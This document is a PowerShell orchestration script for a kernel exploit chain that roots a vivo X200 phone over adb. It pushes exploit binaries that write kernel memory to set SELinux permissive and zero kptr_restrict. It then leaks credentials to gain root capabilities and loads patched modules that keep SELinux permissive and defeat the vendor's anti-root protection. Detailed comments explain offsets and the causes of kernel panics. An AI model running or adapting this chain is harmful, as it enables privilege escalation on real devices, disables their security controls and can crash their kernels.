# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 GhostLock-X200 contributors
param(
  [string]$AdbPath,   # override adb.exe location
  [string]$Serial,    # override device serial
  [string]$WorkDir,   # override package root (default: parent of this script)
  [string]$KsuKoPath, # override kernelsu.ko (default: in-tree modules/kernelsu/kernelsu.ko)
  [string]$PermRestorePath, # override permissive_restore.ko (default: in-tree modules/permissive_restore/permissive_restore.ko)
  [string]$WinOffsPath, # override win_offs json (default: tools/offset_tools/win_offs_b57.json)
  [string]$W2HostPath, # override w2host binary (default: prebuilt/w2host; 机型模块可带)
  [string]$GltPath,    # override glt binary (default: prebuilt/glt_esync; 机型模块可带)
  [string]$ProfilePath, # override 机型模块 device.json (live 元数据用; 可选)
  [switch]$SkipPermissiveRestore, # do NOT load permissive_restore.ko; keep enforcing (network may break)
  [switch]$SkipUptimeWait,        # skip the 240s uptime stability wait (risk: device may not be settled)
  [switch]$SkipStage67            # debug: stop after STAGE5 CAPSROOT, do NOT load modules/kernelsu
  )
$ErrorActionPreference = 'SilentlyContinue'
# ============================================================
# root_full_permissive_restore.ps1 - vivo X200 (PD2415/b57) temporary root chain
# with permissive_restore auto-restoring permissive.
# Chain: STAGE1 permissive (W2) -> STAGE2 kptr (leaf-RED, deterministic)
#   -> STAGE3 base check -> STAGE3.4 dynamic offsets (offsets_auto.py:
#      kallsyms+BTF+disassembly) -> STAGE3.5 repatch(permissive_restore[+kernelsu])+push
#   -> STAGE4 w2host cred leak (sample window W2_CRED_IPS injected)
#   -> STAGE5 CAPSROOT (all write points/child values dynamic)
#   -> STAGE6 INSMOD permissive_restore (enforcing_addr=dynamic) [+ kernelsu]
#   -> STAGE7 after 25s verify permissive + KSU Live + network
# Zero version-dependent hardcoding: every offset comes from the device
# kallsyms/BTF + offline disassembly via offsets_auto.py.
# Compared with root_full_official.ps1: additionally loads permissive_restore.ko whose
# delayed thread writes selinux_state.enforcing=0 ~25s after KSU forces
# enforcing, restoring permissive (KSU sepolicy defect breaks hotspot/network
# under enforcing). KSU later blocks the rootcmd socket, so the permissive_restore
# delayed thread is the ONLY permissive-restore channel -> INSMOD permissive_restore
# BEFORE kernelsu.
# Design: idempotent (completed stages are skipped), strict gates, no
# blind retry loops.
# ============================================================
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$pkgRoot   = Split-Path -Parent (Split-Path -Parent $scriptDir)   # package root (ghostlock-x200-root)
if ($WorkDir) { $pkgRoot = $WorkDir }

# ---- adb: 显式 > 环境 > PATH > 常见位置 > 有界搜索 (共用 find_adb.ps1, 每个候选校验可用性) ----
. (Join-Path $PSScriptRoot "find_adb.ps1")
$adb = Get-AdbPath -Preferred $AdbPath -PackageRoot $pkgRoot -ExtraCandidates @(
  (Join-Path $env:LOCALAPPDATA "GhostLock-X200\deps\platform-tools\adb.exe"))
if (-not $adb) { Write-Output "ADB NOT FOUND: pass -AdbPath, set ANDROID_ADB, or install platform-tools"; exit 1 }
$python = $env:PYTHON
if (-not $python) { $python = (Get-Command python -ErrorAction SilentlyContinue).Source }
if (-not $python) { $python = (Get-Command py -ErrorAction SilentlyContinue).Source }
if (-not $python) { $python = (Get-Command python3 -ErrorAction SilentlyContinue).Source }
if (-not $python) { Write-Output "PYTHON NOT FOUND"; exit 1 }
$PORT = $env:KSU_ROOT_PORT
if (-not $PORT) { $PORT = "19000" }
# device serial: -Serial / $env:ANDROID_SERIAL, else auto-detect single device
$serial = $Serial
if (-not $serial) { $serial = $env:ANDROID_SERIAL }
if (-not $serial) {
  $devs = @(& $adb devices 2>$null | Select-String "	device$" | ForEach-Object { ($_ -split "	")[0] })
  if ($devs.Count -eq 1) { $serial = $devs[0]; Write-Output "auto serial: $serial" }
  elseif ($devs.Count -gt 1) { Write-Output "MULTIPLE DEVICES: set $env:ANDROID_SERIAL"; exit 1 }
  else { Write-Output "NO DEVICE ONLINE"; exit 1 }
}

function Resolve-Asset($pkgRel) {
  $p = Join-Path $pkgRoot $pkgRel
  if (Test-Path $p) { return $p }
  Write-Output "ASSET MISSING: $pkgRel - download the matching GitHub Release assets into the package (prebuilt/ksud, prebuilt/glt_esync, prebuilt/w2host, modules/permissive_restore/permissive_restore.ko)"
  exit 1
}
# KernelSU module: shipped in-tree at modules/kernelsu/kernelsu.ko (GPL-2.0-only,
# built from the vendored official KernelSU v3.2.5 kernel/ sources @ b0bc817b,
# vermagic matches this kernel). Override with -KsuKoPath or $env:KSU_KO_PATH
# (e.g. a module you built yourself). permissive_restore/permissive chain is
# unaffected by the KSU choice.
$KO_OFFICIAL  = $KsuKoPath
if (-not $KO_OFFICIAL) { $KO_OFFICIAL = $env:KSU_KO_PATH }
if (-not $KO_OFFICIAL) { $KO_OFFICIAL = Resolve-Asset "modules\kernelsu\kernelsu.ko" }
$PERM_RESTORE_SRC   = $null
$PERM_RESTORE_SRC   = $PermRestorePath
if (-not $PERM_RESTORE_SRC -and -not $SkipPermissiveRestore) { $PERM_RESTORE_SRC = Resolve-Asset "modules\permissive_restore\permissive_restore.ko" }
$CLEAR_VR_TAG_SRC   = Resolve-Asset "modules\clear_vr_tag\clear_vr_tag.ko"
$KSUD         = Resolve-Asset "prebuilt\ksud"
$GLT          = $GltPath
if (-not $GLT) { $GLT = Resolve-Asset "prebuilt\glt_esync" }
$W2HOST       = $W2HostPath
if (-not $W2HOST) { $W2HOST = Resolve-Asset "prebuilt\w2host" }
$PATCH_ALL    = Resolve-Asset "tools\offset_tools\patch_ko_all.py"
$OFFSETS_AUTO = Resolve-Asset "tools\offset_tools\offsets_auto.py"
$WIN_OFFS     = $WinOffsPath
if (-not $WIN_OFFS) { $WIN_OFFS = Resolve-Asset "tools\offset_tools\win_offs_b57.json" }
$ROOTCMD_CLI  = Resolve-Asset "tools\offset_tools\rootcmd_client.py"
$KSYM_OUT     = Join-Path $env:TEMP ("kallsyms_{0}.txt" -f (Get-Date -Format HHmmss))
$BTF_LOCAL    = Join-Path $env:TEMP "vmlinux.btf"
$OFFS_JSON    = Join-Path $env:TEMP "offsets.json"
# 设备路径用运行唯一后缀 (异常重启会导致 F2FS inode 损坏, 旧文件 rm 不掉)
$tag        = Get-Date -Format "HHmmss"
$dev_glt    = "/data/local/tmp/glt_$tag"
$dev_w2     = "/data/local/tmp/w2host_$tag"
$dev_ksud   = "/data/local/tmp/ksud_$tag"
$dev_perm_restore = "/data/local/tmp/permrestore_$tag.ko"
$dev_clear_vr_tag = "/data/local/tmp/clearvr_$tag.ko"
$dev_ksu    = "/data/local/tmp/kernelsu_$tag.ko"
$dev_sock   = "/data/local/tmp/rootcmd_$tag.sock"
$dev_w2log  = "/data/local/tmp/w2h_$tag.log"
$dev_cred   = "/data/local/tmp/w2cred_$tag.txt"
$dev_proof  = "/data/local/tmp/rootproof_$tag.txt"
$dev_crproof = "/data/local/tmp/capsroot_$tag.txt"   # STAGE5(configfs) glt 写回 proof
$dev_task   = "/data/local/tmp/w2task_$tag.txt"     # w2host 泄漏的 task_struct 地址 (备用)
$dev_dbg    = "/data/local/tmp/w2dbg_$tag.log"
$dev_seq    = "/data/local/tmp/glt_seq_$tag.txt"    # 诊断: 阶段运行标记 (异常重启后仍可拉取)
$dev_diagr  = "/data/local/tmp/diag_root_$tag"      # 诊断: root 级日志快照目录 (STAGE6 起)

function Adb($a) { try { $psi = New-Object System.Diagnostics.ProcessStartInfo; $psi.FileName=$adb; $psi.Arguments="-s $serial $a"; $psi.UseShellExecute=$false; $psi.RedirectStandardOutput=$true; $psi.RedirectStandardError=$true; $p=[System.Diagnostics.Process]::Start($psi); $out=$p.StandardOutput.ReadToEnd(); $err=$p.StandardError.ReadToEnd(); $p.WaitForExit(); return ([string]($out+$err)).Trim() } catch { return "" } }
function Shell($cmd) { return [string](Adb "shell $cmd") }
function Alive { return ((Adb "shell echo ok").Trim() -eq 'ok') }
function Rootcmd($cmd) { Adb "forward tcp:$PORT localfilesystem:$dev_sock" | Out-Null; return ([string](& $python $ROOTCMD_CLI "$cmd" 2>&1 | Out-String)).Trim() }

# ---- 镜像固有偏移 (win_offs_b57.json: 离线反汇编产物, 跨 boot 固定) ----
if (-not (Test-Path $WIN_OFFS)) {
  Write-Output "WIN OFFS MISSING: $WIN_OFFS - pass a valid -WinOffsPath (win_offs_*.json)"
  exit 1
}
$win = Get-Content $WIN_OFFS -Raw | ConvertFrom-Json
$pmb = [Convert]::ToUInt64($win.physmap_base,16)
$se_p0 = ('0x{0:x}' -f ($pmb + [Convert]::ToUInt64($win.sym_offs.selinux_state,16)))
$w0    = ('0x{0:x}' -f ($pmb + [Convert]::ToUInt64($win.sym_offs.kptr_restrict,16) - 8))
Write-Output "镜像固有偏移: se_p0=$se_p0 w0=$w0"
# ---- STAGE0 门禁 (跨机型安全, v1.3.5): win_offs.kernel_release 与设备 /proc/version ----
# 不匹配 = 偏移来自另一个内核构建, 写链目标/宿主全是错地址 -> 写即 panic。
# 在任何内核写之前退出 (连工具都不 push), 杜绝"用错内核的偏移强跑"
# (V2339A 6.1.145 跑 b57 偏移即此路径)。
$devVerRaw = (Shell "cat /proc/version 2>/dev/null").Trim()
$winRelease = [string]$win.kernel_release
if ($winRelease -and $devVerRaw -and $devVerRaw -notlike ("*" + $winRelease + "*")) {
  Write-Output "STAGE0 GATE FAIL: 设备内核与 win_offs 不匹配"
  Write-Output "  device   : $devVerRaw"
  Write-Output "  win_offs : $winRelease"
  Write-Output "  (请用该设备素材重新生成机型模块偏移, 不要复用其他内核构建的偏移)"
  exit 1
}

# ---- GL_LOCK 宿主槽位轮转 (panic 根因修复) ----
# 根因: chain walk 的 _raw_spin_trylock 成功时必然写 [lock+0]=owner,
#       rb_erase 还会写 [lock+8]/[lock+0x10] -> 任何固定宿主第 2 次必失败
#       (trylock 失败 -> spin 卡死) 或窗口期被复用覆盖 panic (payload 页).
# 方案: 每次写原语用 bss 全零区 __dump_skip.zeroes (4KB, 偏移 zeroes_buf)
#       的新槽位 (0x40/槽, 64 槽), 重启后 bss 清零 -> 天然重置.
#       用 boot_id 检测重启, 槽位状态存 PC 端 $env:TEMP/gl_lock_state.txt.
$GL_LOCK_BASE = ('0x{0:x}' -f ($pmb + [Convert]::ToUInt64($win.sym_offs.zeroes_buf,16)))
# 扩容: 槽大小 0x40 -> 0x10 (16B). 反汇编实证 (b57.elf
#   rt_mutex_adjust_prio_chain + remove_waiter 路径):
#   - trylock 成功只写 [lock+0] 4B (arch_spin_trylock 的 cmpxchg)
#   - 0x1057080 str x0,[x24,0x10]: 仅 leftmost==waiter 时执行,
#     首次运行宿主 leftmost=0 -> 不执行
#   - rb_erase(waiter, &lock->waiters): node 非 root ([lock+8]=0 != waiter)
#     -> 只写 [parent 的 left/right] (=业务目标), 不碰 [lock+8]/[lock+0x10]
#   - RED 节点 -> rebalance=NULL -> 无 ____rb_erase_color 旋转
#   -> 宿主污染仅 [lock+0] 4B, 槽 0x10 安全. 4KB zeroes / 0x10 = 256 槽.
$GL_LOCK_SLOT_SIZE = 0x10
$GL_LOCK_SLOTS = 256
$GL_STATE = Join-Path $env:TEMP "gl_lock_state.txt"
function Get-GLLock {
  $bid = (Shell "cat /proc/sys/kernel/random/boot_id 2>/dev/null").Trim()
  $slot = 0; $sbid = ''
  if (Test-Path $GL_STATE) {
    $lines = @(Get-Content $GL_STATE)
    if ($lines.Count -ge 2) { $sbid = $lines[0].Trim(); $slot = [int]$lines[1] }
  }
  if ($bid -ne $sbid) { $slot = 0; $sbid = $bid }   # 重启 -> bss 清零 -> 槽位重置
  # debug 修复: slot 1 (zeroes+0x10) 宿主有毒 (STAGE1/STAGE2 用它均 panic,
  # 手机端 fast_chain/_device_script 实证 "slot 1 宿主有毒, 跳过").
  # 重启后 boot_id 重置 -> STAGE2 必用 slot 1 -> 高频 panic (15:16/15:23/15:34 实证).
  if ($slot -eq 1) { $slot = 2 }
  $lock = ('0x{0:x}' -f ([Convert]::ToUInt64($GL_LOCK_BASE,16) + $slot * $GL_LOCK_SLOT_SIZE))
  Set-Content $GL_STATE ("$sbid`n$($slot + 1)")
  # 根因修复: 必须用 Write-Host 而非 Write-Output!
  # Write-Output 会进入函数输出管道 -> $gl = Get-GLLock 拿到的是
  # "日志文本 + lock值" 的数组 -> run.sh 变成 "GL_LOCK=日志文本 0x...值"
  # -> sh 把 0x... 当命令执行 -> "inaccessible or not found" -> glt 从未
  # 运行 -> STAGE5 永远 FAIL (脚本 0/3 失败 vs 手动 5/5 成功的唯一差异).
  Write-Host "GL_LOCK slot=$slot lock=$lock boot=$($bid.Substring(0,8))"
  # 诊断: GL 槽位也落一条标记 (Write-Host 不进管道/日志, 只有 Mark 能进 glt_seq)
  if ($bid.Length -ge 8) { Mark ("GL slot=$slot lock=$lock boot=" + $bid.Substring(0,8)) }
  return $lock
}

# ---- 诊断标记: 每阶段落一条记录 (写入 /data/local/tmp, 只读无关紧要; 异常重启后由 host 拉取) ----
function Mark([string]$s) {
  # 必须吞掉输出: 裸调用时返回的空字符串会泄漏进外层函数输出流,
  # 曾导致 $gl5 = Get-GLLock 拿到 ("", "0x...") 数组 -> GL_LOCK= 0x... -> glt 未启动
  Shell ("echo '" + $s + " host=" + (Get-Date -Format "HH:mm:ss") + "' >> $dev_seq") | Out-Null
}

# ---- vr.ko 对抗偏移查找 (跨机型, v1.3.5): 机型模块 > b57 默认 > 内置默认+WARN ----
# vr.ko 的 tag/tp 偏移随内核构建不同 (b57 实证 tag_a=6 tag_b=44 tp=1024);
# 非 b57 机型必须在 devices/<id>/vr_offsets.json 提供本机 vr.ko 提取值
# (tools/offset_tools/extract_vr_from_img.py)。返回 @{ tagA; tagB; tp; src }。
function Get-VrOffsets {
  $tagA = 6; $tagB = 44; $tp = 1024; $src = 'builtin-default'
  $cands = @()
  if ($ProfilePath) {
    $modVr = Join-Path (Split-Path -Parent $ProfilePath) "vr_offsets.json"
    if (Test-Path -LiteralPath $modVr) { $cands += $modVr }
  }
  $defVr = Join-Path $PSScriptRoot "vr_offsets.json"
  if (Test-Path -LiteralPath $defVr) { $cands += $defVr }
  foreach ($cand in $cands) {
    try {
      $vro = Get-Content -LiteralPath $cand -Raw | ConvertFrom-Json
      $tagA = [Convert]::ToInt32($vro.tag_a_off)
      $tagB = [Convert]::ToInt32($vro.tag_b_off)
      $tp   = [Convert]::ToInt32($vro.tp_flag)
      $src  = $cand
      break
    } catch {
      Write-Output "VR OFFS WARN: $cand parse failed"
    }
  }
  if ($src -eq 'builtin-default') {
    Write-Output "VR OFFS WARN: 无 vr_offsets.json, 使用默认 tag_a=6 tag_b=44 tp=1024 (非 b57 机型需用本机 vr.ko 提取)"
  }
  return @{ tagA = $tagA; tagB = $tagB; tp = $tp; src = $src }
}

Write-Output "=== root_full_permissive_restore: permissive -> kptr(leaf-RED) -> CAPSROOT -> INSMOD permissive_restore+kernelsu -> 25s permissive ==="
Write-Output "资产: KO=$KO_OFFICIAL PERM_RESTORE=$PERM_RESTORE_SRC GLT=$GLT W2=$W2HOST"

# ---- 等待设备稳定 (uptime > 240s; 交互按 S 跳过, 或 -SkipUptimeWait 参数跳过) ----
if ($SkipUptimeWait) {
  Write-Output "参数 -SkipUptimeWait: 跳过设备稳定等待 (设备未稳定可能导致内核 panic, 风险自担)"
} else {
  # 按键跳过仅在真实控制台可用; stdin 被重定向 (管道/文件) 时 [Console]::KeyAvailable 必抛异常
  $keySkip = $false
  try { $keySkip = -not [Console]::IsInputRedirected } catch { $keySkip = $false }
  if (-not $keySkip) {
    Write-Output "提示: 当前输入非交互 (stdin 重定向), 按键 S 不可用; 如需跳过请加 -SkipUptimeWait 参数 (设备未稳定可能导致内核 panic)"
  }
  for ($i=0; $i -lt 40; $i++) {
    $u = (Shell "cat /proc/uptime").Split(' ')[0]
    if ($u -and [double]$u -gt 240) { Write-Output "uptime=$u OK"; break }
    if ($i % 3 -eq 0) {
      $cur = if ($u) { "$([math]::Round([double]$u))s" } else { "未知" }
      $hint = if ($keySkip) { "; 按 S 跳过" } else { "" }
      Write-Output ("等待设备稳定: uptime=$cur (<240s), 第 {0}/40 轮 (每 10s 轮询{1}) ..." -f ($i+1), $hint)
    }
    if ($keySkip) {
      try {
        if ([Console]::KeyAvailable) {
          $k = [Console]::ReadKey($true)
          if ($k.Key -eq [ConsoleKey]::S) {
            Write-Output "已按 S 跳过设备稳定等待 (设备未稳定可能导致内核 panic, 风险自担)"
            break
          }
        }
      } catch { }
    }
    Start-Sleep -Seconds 10
  }
}
if (-not (Alive)) { Write-Output "DEVICE NOT ALIVE"; exit 1 }

# ---- 推送工具二进制 ----
Shell "rm -f $dev_glt"
Adb "push $GLT $dev_glt" | Out-Null
Shell "chmod 755 $dev_glt"
Shell "rm -f $dev_w2"
Adb "push $W2HOST $dev_w2" | Out-Null
Shell "chmod 755 $dev_w2"
Shell "rm -f $dev_ksud"
Adb "push $KSUD $dev_ksud" | Out-Null
Shell "chmod 755 $dev_ksud"
Mark "PUSH_TOOLS OK"

# ---- STAGE1: permissive (W2 形态, 确定性) ----
Mark "STAGE1 start"
$perm_ok = $false
for ($r=1; $r -le 5; $r++) {
  if (-not (Alive)) { Write-Output "STAGE1 ROUND $r DEVICE DOWN (panic?)"; exit 1 }
  $se = Shell "getenforce"
  if ($se -eq 'Permissive') { Write-Output "PERMISSIVE already OK"; $perm_ok=$true; break }
  Shell "rm -f /data/local/tmp/slide_probe"
    $gl1 = Get-GLLock
    # GL_FPAD=0 (官方对齐): pselect.json 推导 futex_waiter_relative ==
    # pselect_word0_relative (Δ=0) -> 无 FPAD 时 fd_set 与 rt_waiter 天然
    # 对齐 (shift=0), words[11]=GL_LOCK 精确覆盖 lock 字段, words[10]=
    # init_task 命中. FPAD=24 (16B 对齐后 32B) 引入 ~4 words 漂移 ->
    # lock 字段读 fd_set 之外 -> _raw_spin_trylock(垃圾) panic (16:21/16:25
    # e4c 垃圾地址实证). 漂移由 words[4]/[11..14]=GL_LOCK 兜底.
    Shell "echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_SLIDE_ONLY=1 GL_TASK_W2=1 GL_LOCK=$gl1 GL_TARGET=$se_p0 GL_PROBE=1 GL_ATTEMPTS=1 timeout 20 $dev_glt > /data/local/tmp/p.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &"
  for ($i=0; $i -lt 12; $i++) { Start-Sleep -Seconds 5; if (-not (Alive)) { break }; if ((Shell "getenforce") -eq 'Permissive') { $perm_ok=$true; break } }
  if ($perm_ok) { Write-Output "STAGE1 ROUND ${r}: PERMISSIVE OK"; break }
  if (-not (Alive)) { Write-Output "STAGE1 ROUND ${r}: DEVICE DOWN (panic?)"; exit 1 }
  Write-Output "STAGE1 ROUND ${r}: miss (safe), retry"
  Start-Sleep -Seconds 5
}
if (-not $perm_ok) { Mark "STAGE1 FAIL"; Write-Output "STAGE1 FAIL after 5 rounds"; exit 1 }
Mark "STAGE1 OK permissive"

# ---- STAGE2: kptr (叶子 RED 形态, 确定性; GL_W0=kptr_restrict-8) ----
Mark "STAGE2 start"
$kptr_ok = $false
for ($r=1; $r -le 5; $r++) {
  if (-not (Alive)) { Write-Output "STAGE2 ROUND $r DEVICE DOWN"; exit 1 }
  $kp = Shell "cat /proc/sys/kernel/kptr_restrict 2>/dev/null"
  if ($kp.Trim() -eq '0') { Write-Output "KPTR already 0"; $kptr_ok=$true; break }
  Shell "rm -f /data/local/tmp/slide_probe"
  $gl2 = Get-GLLock
  Shell "echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_SLIDE_ONLY=1 GL_TARGET_LEAF=1 GL_LOCK=$gl2 GL_W0=$w0 GL_ENTER_DELAY=5000 GL_ATTEMPTS=1 timeout 25 $dev_glt > /data/local/tmp/kptr.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &"
  for ($i=0; $i -lt 12; $i++) { Start-Sleep -Seconds 5; if (-not (Alive)) { break }; if ((Shell "cat /proc/sys/kernel/kptr_restrict 2>/dev/null").Trim() -eq '0') { $kptr_ok=$true; break } }
  if ($kptr_ok) { Write-Output "STAGE2 ROUND ${r}: KPTR OK (leaf-RED)"; break }
  if (-not (Alive)) { Write-Output "STAGE2 ROUND ${r}: DEVICE DOWN (panic?)"; exit 1 }
  Write-Output "STAGE2 ROUND ${r}: miss, retry"
  Start-Sleep -Seconds 5
}
if (-not $kptr_ok) { Mark "STAGE2 FAIL"; Write-Output "STAGE2 FAIL (kptr != 0)"; exit 1 }
Mark "STAGE2 OK kptr"

# ---- STAGE3: base 严格校验 (12:48 panic 根因修复) ----
Mark "STAGE3 start"
$text = Shell "grep -m1 ' _text$' /proc/kallsyms"
if ($text -notmatch '^([0-9a-f]{16}) T _text$') { Write-Output "STAGE3 FAIL: no _text: '$text'"; exit 1 }
$bstr = $matches[1]
if ($bstr -eq '0000000000000000') { Write-Output "STAGE3 FAIL: _text=0 (kptr masked!)"; exit 1 }
if ($bstr -notmatch '^ffffff[cdef][0-9a-f]+$') { Write-Output "STAGE3 FAIL: base high bits bad: $bstr"; exit 1 }
if ($bstr -notmatch '00000$') { Write-Output "STAGE3 FAIL: base not aligned: $bstr"; exit 1 }
$base = [Convert]::ToUInt64("0x$bstr",16)
Write-Output "STAGE3 OK: base=$bstr"
Mark "STAGE3 OK base=$bstr"

# ---- STAGE3.5a: dump kallsyms (当前 boot, STAGE3.4 输入) ----
Adb "shell cat /proc/kallsyms" | Out-File -FilePath $KSYM_OUT -Encoding ascii
$sz = (Get-Item $KSYM_OUT).Length
if ($sz -lt 1000000) { Write-Output "STAGE3.5a FAIL: kallsyms too small ($sz)"; exit 1 }
Write-Output "STAGE3.5a: kallsyms dumped ($sz bytes)"
# ---- STAGE3.4: 全自动偏移提取 (kallsyms + BTF + 离线反汇编窗口) ----
Adb "pull /sys/kernel/btf/vmlinux $BTF_LOCAL" | Out-Null
if (-not (Test-Path $BTF_LOCAL)) { Write-Output "STAGE3.4 FAIL: btf pull"; exit 1 }
$liveArgs = @("live", $KSYM_OUT, $BTF_LOCAL, $WIN_OFFS, $OFFS_JSON)
if ($ProfilePath) { $liveArgs += @("--profile", $ProfilePath) }
$offOut = & $python $OFFSETS_AUTO @liveArgs 2>&1
$offOut | Select-Object -Last 4 | ForEach-Object { Write-Output "offsets: $_" }
$capsymName = $null
$capsymLine = $offOut | Select-String -Pattern '^capsym:\s+(.+?)\s+@' | Select-Object -First 1
if ($capsymLine) { $capsymName = $capsymLine.Matches[0].Groups[1].Value }
if (-not (Test-Path $OFFS_JSON)) { Write-Output "STAGE3.4 FAIL: offsets.json"; exit 1 }
$off = Get-Content $OFFS_JSON -Raw | ConvertFrom-Json
if (-not $off.selinux_enforcing_p0 -or -not $off.kptr_restrict_p0 -or -not $off.capsym_va) { Write-Output "STAGE3.4 FAIL: offsets incomplete"; exit 1 }
$win_se_p0 = $off.selinux_enforcing_p0
$w0_check = ('0x{0:x}' -f ([Convert]::ToUInt64($off.kptr_restrict_p0,16) - 8))
$cap_off = $off.struct_offsets.cred_cap_permitted
$capsym = $off.capsym_va
$w2ips  = ($off.w2host.cred_ip_offs -join ',')
$w2lo   = $off.w2host.win_lo
$w2hi   = $off.w2host.win_hi
if ($se_p0 -ne $win_se_p0 -or $w0 -ne $w0_check) { Write-Output "STAGE3.4 FAIL: win_offs 与当前 boot 不匹配 ($win_se_p0/$w0_check vs $se_p0/$w0)"; exit 1 }
# ---- 设备内存适配 (真实 MemTotal -> 候选过滤范围) ----
$mem_kb = [int64]((Shell "cat /proc/meminfo | grep MemTotal").Split(' ')[-2])
$mem_bytes = $mem_kb * 1024
$pmb_v = [Convert]::ToUInt64($win.physmap_base,16)
$w2_cand_min = ('0x{0:x}' -f ($pmb_v + 0x40000000))       # 排除低 1GB (内核镜像/固件)
$w2_direct_end = ('0x{0:x}' -f ($pmb_v + $mem_bytes))     # physmap 上限 = 真实内存
Write-Output "设备内存: $([math]::Round($mem_kb/1024/1024,1))GB cand_min=$w2_cand_min direct_end=$w2_direct_end"
Write-Output "STAGE3.4 OK: se=$se_p0 w0=$w0 cap_off=$cap_off capsym=$capsym($capsymName) w2_ips=$w2ips"
Mark "STAGE3.4 OK"
# ---- STAGE3.5: repatch permissive_restore (+kernelsu if provided) + push ----
$KO_PATCHED = Join-Path $env:TEMP "kernelsu_patched_now.ko"
$PERM_RESTORE_PATCHED = Join-Path $env:TEMP "permrestore_patched_now.ko"
if ($KO_OFFICIAL) {
  & $python $PATCH_ALL $KO_OFFICIAL $KSYM_OUT $KO_PATCHED 2>&1 | Select-Object -Last 3 | ForEach-Object { Write-Output "patch kernelsu: $_" }
  if (-not (Test-Path $KO_PATCHED)) { Write-Output "STAGE3.5 FAIL: kernelsu patch no output"; exit 1 }
  Adb "push $KO_PATCHED $dev_ksu" | Out-Null
  Shell "chmod 644 $dev_ksu"
  Write-Output "STAGE3.5: kernelsu.ko ($((Get-Item $KO_PATCHED).Length)B) pushed"
}
if ($PERM_RESTORE_SRC) {
  & $python $PATCH_ALL $PERM_RESTORE_SRC $KSYM_OUT $PERM_RESTORE_PATCHED 2>&1 | Select-Object -Last 3 | ForEach-Object { Write-Output "patch permissive_restore: $_" }
  if (-not (Test-Path $PERM_RESTORE_PATCHED)) { Write-Output "STAGE3.5 FAIL: permissive_restore patch no output"; exit 1 }
  Adb "push $PERM_RESTORE_PATCHED $dev_perm_restore" | Out-Null
  Shell "chmod 644 $dev_perm_restore"
  Write-Output "STAGE3.5 OK: permissive_restore.ko ($((Get-Item $PERM_RESTORE_PATCHED).Length)B) pushed"
} else {
  Write-Output "STAGE3.5 SKIP: -SkipPermissiveRestore (permissive_restore.ko not repatched/pushed)"
}
# clear_vr_tag.ko: vr.ko 反 root 对抗 (kretprobe commit_creds -> 清 task+0x06/0x2c
#   + thread_info 0x400 位). 无它时 KernelSU 的 libksud.so 提权进程 (commit_creds
#   -> vr.ko 标记 -> syscall_trace_exit inline hook do_exit 杀) -> manager
#   "获取 root 失败" + UI 空白. 本模块让提权进程免于被杀.
$CLEAR_VR_TAG_PATCHED = Join-Path $env:TEMP "clearvr_patched_now.ko"
& $python $PATCH_ALL $CLEAR_VR_TAG_SRC $KSYM_OUT $CLEAR_VR_TAG_PATCHED 2>&1 | Select-Object -Last 3 | ForEach-Object { Write-Output "patch clear_vr_tag: $_" }
if (-not (Test-Path $CLEAR_VR_TAG_PATCHED)) { Write-Output "STAGE3.5 FAIL: clear_vr_tag patch no output"; exit 1 }
Adb "push $CLEAR_VR_TAG_PATCHED $dev_clear_vr_tag" | Out-Null
Shell "chmod 644 $dev_clear_vr_tag"
Write-Output "STAGE3.5: clear_vr_tag.ko ($((Get-Item $CLEAR_VR_TAG_PATCHED).Length)B) pushed"
Mark "STAGE3.5 OK"

# ---- STAGE4 前静默门 (v1.3.5 根因修复): 设备忙时写链必 miss ----
# 实测对照: 空闲 2/2 命中, 设备忙 (IO/CPU 风暴) 0/2 miss。STAGE3.4/3.5 的
# kallsyms+BTF 拉取与 patch_all 反汇编后设备仍忙, 立即写 -> R1 miss。
# 等待 loadavg(1min) 回落 + 最少 12s 静默, 上限 120s 未静默则 WARN 继续
# (设备后台应用如 QQ MSF 可能长期占 CPU, 不无限等; 本门禁只吸收工具自身的
# adb 拉取/反汇编负载, 不追求吸收用户应用负载)。等待语义, 不增加写重试。
$qDeadline = (Get-Date).AddSeconds(30)
$qWait = 0
$load1 = 0.0
do {
  $laRaw = Shell "cat /proc/loadavg 2>/dev/null"
  if ($laRaw -match '^\s*([0-9.]+)') { $load1 = [double]$matches[1] }
  if ($load1 -lt 1.5 -and $qWait -ge 12) { break }
  if (-not (Alive)) { Write-Output "STAGE4 QUIESCE: DEVICE DOWN"; exit 1 }
  Start-Sleep -Seconds 2
  $qWait += 2
} while ((Get-Date) -lt $qDeadline)
if ($load1 -ge 1.5) {
  Write-Output "STAGE4 QUIESCE WARN: loadavg=$load1 30s 内未静默 (设备后台负载, 如 QQ MSF), 继续 (R1 miss 概率升高, 由 ROUND 覆盖)"
} else {
  Write-Output "STAGE4 QUIESCE OK: loadavg=$load1 wait=${qWait}s"
}
Mark ("STAGE4 QUIESCE OK loadavg=" + $load1)

# ---- STAGE4+5: w2host cred 泄漏 + CAPSROOT (参数化重试, 每轮新 cred+新槽位) ----
# 根因: w2host perf 采样泄漏的 cred 偶发命中无效/已释放/非 child
#   cred -> glt 写后 w2host_child 检测不到 caps -> proof 空 -> STAGE5 FAIL.
#   手动 4 次全成功证明链路本身稳定, 失败是 cred 候选质量问题.
#   修复: 最多 3 轮, 每轮重新启动 w2host (全新 cred 候选) + 新 GL_LOCK 槽位,
#   每轮有 proof gate 验证. 非盲目重试 (每轮参数全新, 且先杀光残留 w2host
#   避免泄漏命中已提升的残留 cred).
# pkill/pgrep 修复: pkill -f '/data/local/tmp/w2host_' 会匹配到
#   adb shell 命令自身 -> 杀 shell -> w2host 从未启动. 且 pgrep -f 会匹配
#   同命令里 $dev_w2 展开的 w2host_<tag> 字面 (命令自身 adb shell) -> 杀自己.
#   修复: 杀进程与启动拆成两条独立 Shell 调用 (kill 命令只含 [t] 字面).
# ---- 诊断标记: 记录 panic 前的最后动作 (写入 /data/local/tmp, 异常重启后仍存在) ----
$bid0 = (Shell "cat /proc/sys/kernel/random/boot_id 2>/dev/null").Trim()
# 注意: 必须用 >> 追加 (文件由第一个 Mark 创建, 用 > 会清掉 STAGE1-3.5 的阶段标记)
